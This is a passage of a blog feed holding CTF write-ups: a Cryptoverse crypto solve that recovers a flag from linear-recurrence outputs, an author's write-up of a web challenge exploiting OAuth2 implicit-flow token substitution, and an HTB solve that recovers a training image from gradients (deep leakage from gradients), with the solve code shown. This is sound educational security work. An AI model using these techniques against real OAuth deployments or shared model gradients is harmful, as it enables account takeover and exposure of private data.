        <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="p">[</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">]</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">a</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">FLAG</span><span class="p">[:</span><span class="mi">6</span><span class="p">])</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">b</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">FLAG</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">])</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">c</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">FLAG</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">18</span><span class="p">])</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">d</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">FLAG</span><span class="p">[</span><span class="mi">18</span><span class="p">:])</span>
            <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">p</span> <span class="o">&gt;</span> <span class="nb">max</span><span class="p">([</span><span class="bp">self</span><span class="p">.</span><span class="n">a</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">b</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">d</span><span class="p">]):</span>
                <span class="k">break</span>
    <span class="k">def</span> <span class="nf">Generate</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">a</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">b</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">c</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">d</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">p</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">state</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">data</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">vault</span> <span class="o">=</span> <span class="n">HoYoVault</span><span class="p">(</span><span class="n">getRandomInteger</span><span class="p">(</span><span class="mi">128</span><span class="p">),</span> <span class="n">getRandomInteger</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span> <span class="n">getRandomInteger</span><span class="p">(</span><span class="mi">512</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"data = "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">([</span><span class="n">vault</span><span class="p">.</span><span class="n">Generate</span><span class="p">()</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"p = "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">vault</span><span class="p">.</span><span class="n">p</span><span class="p">))</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span> 
<span class="c1"># data = [14169084828739113416, 12950362233651727953, 13081576751296291893, 11189892724250189745, 2366046383900978737, 1749792629103627315, 8575562236709928474]
# p = 16200480981168924301
</span></code></pre></div></div>

<p>From the code, I can see the outputted <code class="highlighter-rouge">data</code> is generated through the flag and previous states, while the generated <code class="highlighter-rouge">data</code> is appended to <code class="highlighter-rouge">state</code> to be used in generating future <code class="highlighter-rouge">data</code>.</p>

<p>With enough data output provided, I can form a system of linear equations, and solve for the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="mi">14169084828739113416</span><span class="p">,</span> <span class="mi">12950362233651727953</span><span class="p">,</span> <span class="mi">13081576751296291893</span><span class="p">,</span> <span class="mi">11189892724250189745</span><span class="p">,</span> <span class="mi">2366046383900978737</span><span class="p">,</span> <span class="mi">1749792629103627315</span><span class="p">,</span> <span class="mi">8575562236709928474</span><span class="p">]</span>
<span class="c1"># modified from code from https://stackoverflow.com/a/62600438
</span><span class="kn">import</span> <span class="nn">sympy</span>
<span class="n">eq</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">values</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="mi">3</span><span class="p">):</span>
    <span class="n">eq</span><span class="p">.</span><span class="n">append</span><span class="p">([</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">],</span> <span class="mi">1</span><span class="p">])</span>
    <span class="n">values</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">])</span>
<span class="n">eq</span> <span class="o">=</span> <span class="n">sympy</span><span class="p">.</span><span class="n">Matrix</span><span class="p">(</span><span class="n">eq</span><span class="p">)</span>
<span class="n">values</span> <span class="o">=</span> <span class="n">sympy</span><span class="p">.</span><span class="n">Matrix</span><span class="p">(</span><span class="n">values</span><span class="p">)</span>
<span class="n">m</span> <span class="o">=</span> <span class="mi">16200480981168924301</span>
<span class="n">det</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">eq</span><span class="p">.</span><span class="n">det</span><span class="p">())</span>
<span class="k">if</span> <span class="n">gcd</span><span class="p">(</span><span class="n">det</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">ans</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">det</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">m</span><span class="p">))</span> <span class="o">*</span> <span class="n">eq</span><span class="p">.</span><span class="n">adjugate</span><span class="p">()</span> <span class="o">@</span> <span class="n">values</span> <span class="o">%</span> <span class="n">m</span>
<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<p>I was also trying to use <code class="highlighter-rouge">solve_mod</code> in SageMath instead of pulling code from Stack Overflow, which worked great in one of the ImaginaryCTF challenges sharing the very similar idea but with an a lot smaller modulus. However, when I used it in this challenge, I got the following error:</p>

<p><code class="highlighter-rouge">OverflowError: Python int too large to convert to C ssize_t</code></p>

<p>After the CTF ended, <a href="https://discord.com/channels/1016576148576157766/1103734101363658812/1105015730967150733">on Cryptoverse Discord server</a>, Neobeo from the “Social Engineering Experts” team (I think) suggested that they were able to define the linear equations in a Finite Field in SageMath and used <code class="highlighter-rouge">solve_right</code> to solve the equations.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Cryptoverse CTF 2023 On CTFtime]]></summary></entry><entry><title type="html">pwnEd4 Quals CTF Vault (Web) Author Writeup</title><link href="https://www.cjxol.com/posts/pwned4-quals-ctf-web-vault-author-writeup/" rel="alternate" type="text/html" title="pwnEd4 Quals CTF Vault (Web) Author Writeup" /><published>2023-02-20T00:00:00+00:00</published><updated>2023-02-20T00:00:00+00:00</updated><id>https://www.cjxol.com/posts/pwned4-quals-ctf-web-vault-author-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/pwned4-quals-ctf-web-vault-author-writeup/"><![CDATA[<p>Challenge code and is available at <a href="https://github.com/allc/Vault-CTF-Chall">https://github.com/allc/Vault-CTF-Chall</a>.</p>

<p>This is my writeup to the web challenge I created for <a href="https://pwned.sigint.mx/">pwnEd4</a> Quals CTF organised by University of Edinburgh’s cyber security society <a href="https://sigint.mx/">SIGINT</a>. The online CTF was on 18th and 19th for 32 hours. With over 30 teams submitted at least one flag, only 2 teams successfully solved this web challenge.</p>

<p>This challenge exploits improper use of OAuth2 for authentication, more specifically with Implicit Flow. It is inspired by <a href="https://github.com/allc/CTF-Archive-App/commit/e69dee6244ae723780845d8e54e71b82720fafc8">a vulnerability I made in my own project</a>, as well as similar issues found in the wild (in my opinion this can partly attribute to developer docs failing to make it clear about the danger of using OAuth2 Implicit Grant).</p>

<p>To understand this challenge, it is helpful to know about both OAuth2 Authorization Code Grant and Implicit Grant, and here are some resources: <a href="https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type">https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type</a> and <a href="https://developer.okta.com/blog/2018/05/24/what-is-the-oauth2-implicit-grant-type">https://developer.okta.com/blog/2018/05/24/what-is-the-oauth2-implicit-grant-type</a>.</p>

<h2 id="the-challenge">The Challenge</h2>

<p>The challenges has a “Vault” app, where the flag is stored in.</p>

<p><img src="/assets/image/pwned4-quals-ctf-web-vault-author-writeup/vault.png" alt="Vault" /></p>

<p>Clicking on “View flag”, it redirects to the auth server to login. Logging in with a newly created account, it redirects back to the Vault app’s flag page, however, it says do not have permission to view the flag.</p>

<p>In the auth service, any registered user can create apps.</p>

<p><img src="/assets/image/pwned4-quals-ctf-web-vault-author-writeup/app.png" alt="App config page in auth service" /></p>

<p>When “publishing” the app, the admin bot will try to authorize the app, resulting in a request to the redirect URL with the authorization code.</p>

<h2 id="the-solve">The Solve</h2>

<p>Substituting the code with the one in admin bot’s request to login to Vault would not work, as the OAuth2 server will be able to tell the code is not for Vault thus not valid, when Vault exchanges token using the code along with its client ID and secret.</p>

<p>The solution to this challenge is to exchange the authorization code for access token with the valid client ID and client secret at auth service’s <code class="highlighter-rouge">/oauth2/token</code> endpoint, and substitute the token into Vault’s implicit flow callback.</p>

<p>There are two hints in the challenge that the Vault app supports implicit flow. One is on the auth service config page, where it can generates OAuth2 URL for an app. In the response type selection, there is a “token” option (though it’s on the auth service, it’s in a CTF challenge, it must be relevant :P). Replace “response_type” from <code class="highlighter-rouge">code</code> to <code class="highlighter-rouge">token</code> in the login page and proceed the authorisation normally will confirm Vault supports implicit flow. Another is on the screen confirming authorising Vault app, click “Cancel”, the callback page will render Javascript tries to use implicit flow.</p>

<p><img src="/assets/image/pwned4-quals-ctf-web-vault-author-writeup/callback-source.png" alt="App config page in auth service" /></p>

<p>To solve the challenge less painfully, there are some details. One is that the access code can only be used to exchange for token once, within valid time. Another is “state” only stay valid before sent to callback endpoint in Vault. To generate a new valid state, click on “Login” in Vault again, and the state can only be used with the session cookie.</p>

<h2 id="conclusion">Conclusion</h2>

<p>OAuth2 is for authorisation, and can be dangerous used for authentication without additional checks. Implicit Grant should be avoided. Developer docs should make clear of security implications.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><category term="ctf neural network" /><summary type="html"><![CDATA[Challenge code and is available at https://github.com/allc/Vault-CTF-Chall.]]></summary></entry><entry><title type="html">HTB University CTF 2022 Deaths Glance (Misc) Writeup</title><link href="https://www.cjxol.com/posts/htb-uni-ctf-2022-misc-writeup/" rel="alternate" type="text/html" title="HTB University CTF 2022 Deaths Glance (Misc) Writeup" /><published>2022-12-08T00:00:00+00:00</published><updated>2022-12-08T00:00:00+00:00</updated><id>https://www.cjxol.com/posts/htb-uni-ctf-2022-misc-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/htb-uni-ctf-2022-misc-writeup/"><![CDATA[<p>This is my writeup for the only Misc challenge “Deaths Glance” in <a href="https://ctf.hackthebox.com/event/details/htb-university-ctf-2022-supernatural-hacks-696">HTB University CTF 2022</a> (<a href="https://ctftime.org/event/1825">on CTFtime</a>).</p>

<p>The challenge was initially labelled as “easy” at the beginning of the event, and was changed to “medium” after 2 hours into the CTF with no solves to this challenge. Our team was the 2nd solved and submitted flag to this challenge, about one or two hours after the challenge first been solved about 24 hours into the CTF. There were 6 solves to this challenge in the 54 hours CTF with 328 teams submitted at least one flag.</p>

<h2 id="the-challenge">The Challenge</h2>

<p>The challenge is given with the following description:</p>

<blockquote>
  <p>You find yourself in possession of an ancient forbidden spell. Rumors have it that by revealing the rune originated from the spell, the mystery behind how you perish will be unveiled.</p>
</blockquote>

<p>The challenge is also with a downloadable containing a <code class="highlighter-rouge">forbiden_spell.pt</code> file and a <code class="highlighter-rouge">challenge.py</code> file.</p>

<p>The Python file contains a convolutional neural network implemented in PyTorch, with the weights initialisation using a fixed seed, and code in comments defining some <code class="highlighter-rouge">dummy_data_size</code>. The model is for classification with 100 output classes, and input is 1-channel (greyscale) 32x32 image.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">torch</span>
<span class="kn">import</span> <span class="nn">torch.nn</span> <span class="k">as</span> <span class="n">nn</span>
<span class="n">torch</span><span class="p">.</span><span class="n">manual_seed</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
<span class="n">device</span> <span class="o">=</span> <span class="s">"cpu"</span>

<span class="k">def</span> <span class="nf">weights_init</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s">"weight"</span><span class="p">):</span>
        <span class="n">m</span><span class="p">.</span><span class="n">weight</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">uniform_</span><span class="p">(</span><span class="o">-</span><span class="mf">0.5</span><span class="p">,</span> <span class="mf">0.5</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s">"bias"</span><span class="p">):</span>
        <span class="n">m</span><span class="p">.</span><span class="n">bias</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">uniform_</span><span class="p">(</span><span class="o">-</span><span class="mf">0.5</span><span class="p">,</span> <span class="mf">0.5</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">LeNet</span><span class="p">(</span><span class="n">nn</span><span class="p">.</span><span class="n">Module</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">(</span><span class="n">LeNet</span><span class="p">,</span> <span class="bp">self</span><span class="p">).</span><span class="n">__init__</span><span class="p">()</span>
        <span class="n">act</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="n">Sigmoid</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="n">Sequential</span><span class="p">(</span>
            <span class="n">nn</span><span class="p">.</span><span class="n">Conv2d</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">kernel_size</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">5</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">stride</span><span class="o">=</span><span class="mi">2</span><span class="p">),</span>
            <span class="n">act</span><span class="p">(),</span>
            <span class="n">nn</span><span class="p">.</span><span class="n">Conv2d</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">kernel_size</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">5</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">stride</span><span class="o">=</span><span class="mi">2</span><span class="p">),</span>
            <span class="n">act</span><span class="p">(),</span>
            <span class="n">nn</span><span class="p">.</span><span class="n">Conv2d</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">kernel_size</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">5</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">stride</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span>
            <span class="n">act</span><span class="p">(),</span>
            <span class="n">nn</span><span class="p">.</span><span class="n">Conv2d</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">kernel_size</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">5</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">stride</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span>
            <span class="n">act</span><span class="p">(),</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">fc</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="n">Sequential</span><span class="p">(</span>
            <span class="n">nn</span><span class="p">.</span><span class="n">Linear</span><span class="p">(</span><span class="mi">768</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
        <span class="p">)</span>
        
    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
        <span class="n">out</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">body</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">view</span><span class="p">(</span><span class="n">out</span><span class="p">.</span><span class="n">size</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">out</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">fc</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">out</span>
    
<span class="n">net</span> <span class="o">=</span> <span class="n">LeNet</span><span class="p">().</span><span class="n">to</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
<span class="n">net</span><span class="p">.</span><span class="nb">apply</span><span class="p">(</span><span class="n">weights_init</span><span class="p">)</span>
<span class="n">criterion</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="n">CrossEntropyLoss</span><span class="p">()</span>

<span class="s">"""
forbidden_spell = torch.load('path to challenge file')
dummy_data_size=torch.Size([1, 1, 32, 32])

#code here 
"""</span>
</code></pre></div></div>

<p>Load and inspecting <code class="highlighter-rouge">forbidden_spell.pt</code>, it contains a list of torch tensors, the shape of the data in the file matches with the model parameters of the model defined in <code class="highlighter-rouge">challenge.py</code> . Their shape can be printed out with <code class="highlighter-rouge">for s in forbidden_spell: print(s.shape)</code> and <code class="highlighter-rouge">for parameters in net.parameters(): print(parameters.shape)</code> respectively, and gives:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>torch.Size([12, 1, 5, 5])
torch.Size([12])
torch.Size([12, 12, 5, 5])
torch.Size([12])
torch.Size([12, 12, 5, 5])
torch.Size([12])
torch.Size([12, 12, 5, 5])
torch.Size([12])
torch.Size([100, 768])
torch.Size([100])
</code></pre></div></div>

<p>The description of the challenge does not seem clear with meaningful information (which is even misleading to me, as it turns out the challenge is indeed to work backwards while the description says “the rune originated from the spell”). The data in the <code class="highlighter-rouge">pt</code> file matches the shape of the model parameters perfectly, maybe it is the model weights, or maybe it is something else? Does the manual seed matter or it’s just irrelevant?</p>

<p>It seems I would either happen to know the attack or I have to do a lot of guessing work.</p>

<h2 id="the-solve">The Solve</h2>

<p>After some <a href="#other-irrelevant-path-we-went-down">trial and error, some guessing and research</a>, we found very interesting research <a class="citation" href="#zhu19deep">(Zhu et al., 2019)</a> and <a href="https://github.com/mit-han-lab/dlg">GitHub repository</a> with <a href="https://github.com/mit-han-lab/dlg/blob/master/models/vision.py#L15">model</a> very similar to the model used in the challenge.</p>

<p>Both the research and the code demonstration shows the possibility to recover training data with just model and the gradients for the data. The idea is to train some dummy data and label to produce the gradients that match the given gradient using gradient descent methods.</p>

<p>To this challenge, we realised instead of being the weights, the “forbidden spell” given in the <code class="highlighter-rouge">pt</code> file could be the gradient from the training data (which could a image lead to the flag), and the model should be initialised with the given random seed and initialisation functions. We modified the script <a href="https://github.com/mit-han-lab/dlg/blob/master/main.py"><code class="highlighter-rouge">main.py</code> in the GitHub repository</a> to solve the challenge (append to original <code class="highlighter-rouge">challenge.py</code>):</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"""
Need to include original challenge script here.
Also initialising the model with the given random seed is very important!
"""</span>

<span class="kn">import</span> <span class="nn">torch.nn.functional</span> <span class="k">as</span> <span class="n">F</span>
<span class="kn">from</span> <span class="nn">torchvision</span> <span class="kn">import</span> <span class="n">transforms</span>
<span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="n">plt</span>

<span class="k">def</span> <span class="nf">cross_entropy_for_onehot</span><span class="p">(</span><span class="n">pred</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">torch</span><span class="p">.</span><span class="n">mean</span><span class="p">(</span><span class="n">torch</span><span class="p">.</span><span class="nb">sum</span><span class="p">(</span><span class="o">-</span> <span class="n">target</span> <span class="o">*</span> <span class="n">F</span><span class="p">.</span><span class="n">log_softmax</span><span class="p">(</span><span class="n">pred</span><span class="p">,</span> <span class="n">dim</span><span class="o">=-</span><span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">))</span>

<span class="n">tt</span> <span class="o">=</span> <span class="n">transforms</span><span class="p">.</span><span class="n">ToPILImage</span><span class="p">()</span>

<span class="c1"># Load the gradient
</span><span class="n">original_dy_dx</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="s">'forbidden_spell.pt'</span><span class="p">)</span>
<span class="n">original_dy_dx</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="n">original_dy_dx</span><span class="p">)</span>

<span class="c1"># generate dummy data and label
</span><span class="n">dummy_data</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">randn</span><span class="p">((</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">)).</span><span class="n">to</span><span class="p">(</span><span class="n">device</span><span class="p">).</span><span class="n">requires_grad_</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
<span class="n">dummy_label</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">randn</span><span class="p">((</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)).</span><span class="n">to</span><span class="p">(</span><span class="n">device</span><span class="p">).</span><span class="n">requires_grad_</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>

<span class="n">optimizer</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">optim</span><span class="p">.</span><span class="n">LBFGS</span><span class="p">([</span><span class="n">dummy_data</span><span class="p">,</span> <span class="n">dummy_label</span><span class="p">])</span>
<span class="n">criterion</span> <span class="o">=</span> <span class="n">cross_entropy_for_onehot</span>

<span class="k">for</span> <span class="n">iters</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">closure</span><span class="p">():</span>
        <span class="n">optimizer</span><span class="p">.</span><span class="n">zero_grad</span><span class="p">()</span>

        <span class="n">dummy_pred</span> <span class="o">=</span> <span class="n">net</span><span class="p">(</span><span class="n">dummy_data</span><span class="p">)</span> 
        <span class="n">dummy_onehot_label</span> <span class="o">=</span> <span class="n">F</span><span class="p">.</span><span class="n">softmax</span><span class="p">(</span><span class="n">dummy_label</span><span class="p">,</span> <span class="n">dim</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">dummy_loss</span> <span class="o">=</span> <span class="n">criterion</span><span class="p">(</span><span class="n">dummy_pred</span><span class="p">,</span> <span class="n">dummy_onehot_label</span><span class="p">)</span> 
        <span class="n">dummy_dy_dx</span> <span class="o">=</span> <span class="n">torch</span><span class="p">.</span><span class="n">autograd</span><span class="p">.</span><span class="n">grad</span><span class="p">(</span><span class="n">dummy_loss</span><span class="p">,</span> <span class="n">net</span><span class="p">.</span><span class="n">parameters</span><span class="p">(),</span> <span class="n">create_graph</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        
        <span class="n">grad_diff</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">gx</span><span class="p">,</span> <span class="n">gy</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">dummy_dy_dx</span><span class="p">,</span> <span class="n">original_dy_dx</span><span class="p">):</span> 
            <span class="n">grad_diff</span> <span class="o">+=</span> <span class="p">((</span><span class="n">gx</span> <span class="o">-</span> <span class="n">gy</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span><span class="p">).</span><span class="nb">sum</span><span class="p">()</span>
        <span class="n">grad_diff</span><span class="p">.</span><span class="n">backward</span><span class="p">()</span>
        
        <span class="k">return</span> <span class="n">grad_diff</span>
    
    <span class="n">optimizer</span><span class="p">.</span><span class="n">step</span><span class="p">(</span><span class="n">closure</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">iters</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> 
        <span class="n">current_loss</span> <span class="o">=</span> <span class="n">closure</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">iters</span><span class="p">,</span> <span class="s">"%.4f"</span> <span class="o">%</span> <span class="n">current_loss</span><span class="p">.</span><span class="n">item</span><span class="p">())</span>
        <span class="n">plt</span><span class="p">.</span><span class="n">imshow</span><span class="p">(</span><span class="n">tt</span><span class="p">(</span><span class="n">dummy_data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cpu</span><span class="p">()))</span>
        <span class="c1"># plt.savefig(f'save/{iters}.png')
</span>        <span class="c1"># torch.save(dummy_data[0].cpu(), f'save/{iters}.pt')
</span></code></pre></div></div>

<p>After about 20-30 iterations, we got a QR code that we could scan with many of the QR code scan apps on our phones.</p>

<p><img src="/assets/image/htb-uni-ctf-2022-deaths-glance-recover-input.png" alt="QR code being recovered after about 20-30 iterations." /></p>

<p>Scan the QR code, got the flag <code class="highlighter-rouge">HTB{d0nt_sh4r3_y0ur_fl4g}</code>.</p>

<h2 id="other-irrelevant-path-we-went-down">Other (Irrelevant) Path We Went Down</h2>

<p>Initially, we thought the given <code class="highlighter-rouge">pt</code> file is the weights of the model, and the challenge would be solved by somehow getting the input data. I came across a Misc challenge called “Battle in OrI/On” in <a href="https://www.hackthebox.com/events/cyber-apocalypse-2022">HTB Cyber Apocalypse CTF 2022</a>, which was to find the input of the neural net which gives the required output. For this challenge, we tried to train the input data for every of the 100 possible output classes (assuming the output would look like one-hot encoding). However, we did not see anything looks like the flag in the trained pattern.</p>

<p>Looking at the patterns for each of the possible output classes, we noticed that class 55 outputs very different patterns to everything else, as well as the loss for that class is always 0 or near 0. We inspected the last tensor (we assumed it was the bias of the output layer) in the <code class="highlighter-rouge">pt</code> file, and noticed a large- close-to-1 value at index 55. I guessed that maybe class 55 is the output, but the input was not learning because of almost no loss due to the large bias, so I manually set the bias to a very negative value and train the input. However, we still did not get the flag.</p>

<p>There were other things we tried, including to have random input or trained pattern from above as input and visualise each layer of the model output.</p>

<h2 id="references">References</h2>

